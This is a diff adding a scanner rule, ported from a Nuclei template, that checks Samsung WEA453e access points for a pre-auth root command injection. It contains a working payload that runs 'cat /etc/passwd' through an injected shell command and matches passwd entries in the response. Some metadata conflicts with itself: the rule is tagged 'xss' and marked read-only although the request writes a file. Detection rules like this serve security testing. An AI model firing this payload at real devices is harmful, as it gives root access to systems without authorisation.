@@ -1,0 +1,34 @@
+schema_version: 1
+id: "cortex.community:samsung-wlan-ap-rce"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Samsung WLAN AP WEA453e - Remote Code Execution"
+  description: "Samsung WLAN AP WEA453e is vulnerable to a pre-auth root remote command execution vulnerability, which means an attacker could run code as root remotely without logging in. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://omriinbar.medium.com/samsung-wlan-ap-wea453e-vulnerabilities-7aa4a57d4dba"
+  cwes: [78]
+  tags: ["xss", "samsung", "rce", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Critical"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request:
+      method: "POST"
+      path: "/(download)/tmp/poc.txt"
+      body: "command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt"
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - any:
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "bin:.*:1:1" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
